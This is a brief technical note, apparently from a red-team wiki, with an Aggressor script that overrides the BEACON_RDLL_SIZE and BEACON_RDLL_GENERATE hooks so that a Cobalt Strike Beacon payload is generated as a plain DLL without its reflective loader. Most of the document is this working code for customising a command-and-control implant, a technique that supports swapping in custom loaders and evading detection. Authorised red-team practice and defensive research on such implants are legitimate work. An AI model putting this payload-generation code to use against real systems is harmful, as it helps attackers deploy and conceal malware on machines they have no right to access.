# UDRLess Beacon



## Introduction

Beacon comes precompiled with it's own User Defined Reflective Loader, but we may want to generate a just a standard beacon DLL. Here's a Aggressor script to do so:

```
# ------------------------------------ 
# $1 = DLLfilename 
# $2 = arch 
# ------------------------------------ 
 
set BEACON_RDLL_SIZE { 
    warn("Running 'BEACON_RDLL_SIZE' for DLL " .$1. " with architecture " .$2);    
    return "0"; 
}

set BEACON_RDLL_GENERATE {
    local('$arch $beacon $fileHandle $ldr $path $payload');
    $beacon = $2;
    $arch = $3;

    # Apply the transformations to the beacon payload
    $beacon = setup_transformations($beacon, $arch);
	
    return $beacon;
    }
```
